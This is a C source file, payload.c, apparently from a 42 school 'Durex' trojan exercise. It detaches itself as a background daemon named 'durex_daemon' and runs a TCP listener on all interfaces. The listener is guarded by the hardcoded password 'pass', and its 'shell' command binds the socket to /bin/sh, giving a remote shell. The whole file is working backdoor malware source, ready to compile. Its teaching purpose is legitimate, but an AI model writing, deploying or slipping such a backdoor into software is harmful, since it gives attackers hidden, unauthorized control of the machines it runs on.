/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   payload.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: eparisot <eparisot@42.student.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/05/25 14:55:42 by eparisot          #+#    #+#             */
/*   Updated: 2021/05/25 14:55:42 by eparisot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../includes/payload.h"

int daemonize(char* name, char* path, char* infile, char *outfile, char *errfile)
{
	pid_t pid;

	if (!path) {path="/";}
    if (!name) {name="durex_daemon";}
	if (!infile) {infile="/dev/null";}
    if (!outfile) {outfile="/dev/null";}
    if (!errfile) {errfile="/dev/null";}
    // Fork off the parent process
    pid = fork();
    // An error occurred
    if (pid < 0)
        exit(EXIT_FAILURE);
    // Success: Let the parent terminate
    if (pid > 0)
        exit(EXIT_SUCCESS);
    // On success: The child process becomes session leader
    if (setsid() < 0)
        exit(EXIT_FAILURE);
    // Catch, ignore and handle signals
    //TODO: Implement a working signal handler
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
	// Fork off for the second time
    pid = fork();
    // An error occurred
    if (pid < 0)
        exit(EXIT_FAILURE);
    // Success: Let the parent terminate
    if (pid > 0)
        exit(EXIT_SUCCESS);
    // Set new file permissions
    umask(0);
    // Change the working directory to the root directory
    if (chdir("/"))
		exit(EXIT_FAILURE);
	//Close all open file descriptors
    for(int fd=sysconf(_SC_OPEN_MAX); fd > 0; --fd)
    {
        close(fd);
    }
    //reopen stdin, stdout, stderr
    stdin = fopen(infile,"r");   //fd=0
    stdout = fopen(outfile,"w+");  //fd=1
    stderr = fopen(errfile,"w+");  //fd=2
	return 0;
}

int r_shell(void)
{
	struct sockaddr_in server_address;
	struct sockaddr_in client_address;
	socklen_t client_addr_size;
	int clients_sockets[MAX_CLIENTS];
	int master_sd = 0;
	int opt = 1;
	int activity = 0;
	//set of socket descriptors 
    fd_set readfds; 
	int max_sd = 0; 
	int new_socket = 0;
	int sd = 0;
	char buffer[1025] = {0};
	int valread;
	int pid;
	char hello_msg[] = "Password: ";
	char conn_refused_msg[] = "Connexion refused\n";
	char welcome_msg[] = "Welcome !\nCommands:\n\tshell:\tspawn a shell\n\tstop:\tstop server\n>: ";
	char confirm_msg[] = "Are you sure ? (y - n): ";

	for (int i = 0; i < MAX_CLIENTS; ++i)
	{
		clients_sockets[i] = 0;
	}
	// set the server address
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY;
    server_address.sin_port = htons(REMOTE_PORT);
	// open socket
    master_sd = socket(AF_INET, SOCK_STREAM, 0);
	if (master_sd < 0)
	{
		printf("error opening socket\n");
		return -1;
	}
	// set socket options
	if (setsockopt(master_sd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)))
    {
        printf("error setting socket options\n");
		close(master_sd);
		return -1;
    }
	// bind socket to if
    if (bind(master_sd, (const struct sockaddr *)&server_address, sizeof(server_address)))
	{
		printf("error binding socket\n");
		close(master_sd);
		return -1;
	}
	// listen for connexions
	if (listen(master_sd, MAX_CLIENTS) < 0)
	{
		printf("error listening socket\n");
		close(master_sd);
		return -1;
	}
	while (1)
	{
		//clear the socket set 
        FD_ZERO(&readfds);  
        //add master socket to set 
        FD_SET(master_sd, &readfds);  
        max_sd = master_sd;
		//add child sockets to set 
        for (int i = 0; i < MAX_CLIENTS; i++)  
        {                  
            //if valid socket descriptor then add to read list 
            if (clients_sockets[i] > 0)  
                FD_SET(clients_sockets[i], &readfds);  
                 
            //highest file descriptor number, need it for the select function 
            if (clients_sockets[i] > max_sd)  
                max_sd = clients_sockets[i];  
        }
		//wait for an activity on one of the sockets, timeout is NULL, so wait indefinitely
		activity = select(max_sd + 1, &readfds, NULL, NULL, NULL);

		if ((activity < 0) && (errno != EINTR))  
        {  
            //printf("error select\n");  
        }
		//If something happened on the master socket, then its an incoming connection 
        if (FD_ISSET(master_sd, &readfds))  
        {
			if ((new_socket = accept(master_sd, (struct sockaddr *)&client_address, &client_addr_size)) < 0)  
			{
				printf("error accepting connexion\n");  
				return -1;  
			}
			//add new socket to array of sockets 
			int found = 0;
			for (int i = 0; i < MAX_CLIENTS; i++)  
			{
				//if position is empty 
				if(clients_sockets[i] == 0)  
				{  
					clients_sockets[i] = new_socket;  
					//printf("Adding to list of sockets as %d\n", i);  
					found = 1;
					break;  
				}
			}
			if (found == 0)
				continue;
			//inform user of socket number - used in send and receive commands 
			//printf("New connection , socket fd is %d , ip is : %s , port : %d\n", new_socket, inet_ntoa(client_address.sin_addr), ntohs(client_address.sin_port));  
			send(new_socket, hello_msg, strlen(hello_msg), 0);
			// check password
			if (read(new_socket, buffer, 1024) < 0)
			{
				printf("error reading socket content\n");
				close(master_sd);
				return -1;
			}
			if (strncmp(buffer, "pass", 4))
			{
				send(new_socket, conn_refused_msg, strlen(conn_refused_msg), 0);
				close(new_socket);
				continue;
			}
			send(new_socket, welcome_msg, strlen(welcome_msg), 0); 
			//printf("Welcome message sent successfully\n");  
		}
		//else its some IO operation on some other socket
        for (int i = 0; i < MAX_CLIENTS; i++)  
        {
            sd = clients_sockets[i];  
            if (FD_ISSET(sd , &readfds))  
            {
                //Check if it was for closing , and also read the incoming message 
                if ((valread = read(sd, buffer, 1024)) == 0)  
                {
                    //Somebody disconnected , get his details and print 
                    //getpeername(sd, (struct sockaddr*)&client_address, &client_addr_size);  
                    //printf("Host disconnected , ip %s , port %d \n", inet_ntoa(client_address.sin_addr), ntohs(client_address.sin_port));
                         
                    //Close the socket and mark as 0 in list for reuse 
                    close(sd);
                    clients_sockets[i] = 0;
                }
                //Handle commands
                else
                {  
                    //set the string terminating NULL byte on the end of the data read 
                    buffer[valread] = '\0';
					// handle shell command
                    if (strncmp(buffer, "shell", 5) == 0)
					{
						pid = fork();
						if (pid == 0)
						{
							// Start reverse shell
							dup2(clients_sockets[i], 0);
							dup2(clients_sockets[i], 1);
							dup2(clients_sockets[i], 2);
							close(clients_sockets[i]);
							char * const argv[] = {"/bin/sh", NULL};
							execve("/bin/sh", argv, NULL);
							// execve only return in case of trouble 
							clients_sockets[i] = 0;
							exit(EXIT_FAILURE);
						}
					} 
					else if (strncmp(buffer, "stop", 4) == 0)
					{
						send(clients_sockets[i], confirm_msg, strlen(confirm_msg), 0);
						if (read(clients_sockets[i], buffer, 1024) < 0)
						{
							printf("error reading socket content\n");
							close(master_sd);
							return -1;
						}
						if (strncmp(buffer, "y", 1) == 0)
						{
							for (int i = 0; i < MAX_CLIENTS; ++i)
							{
								close(clients_sockets[i]);
							}
							close(master_sd);
							return 1;
						}
					}
					// echo
					//send(sd, buffer, strlen(buffer), 0); 
                }
            }
        }
	}
	return 0;
}

int main(void)
{
	if (daemonize("durex_daemon", "/", "/dev/fd/0", "/dev/fd/1", "/dev/fd/2"))
	{
		printf("Failed to run daemon\n");
		return EXIT_FAILURE;
	}
	while (1)
	{
		if (r_shell())
		{
			break;
		}
		sleep(1);
	}
	return EXIT_SUCCESS;
}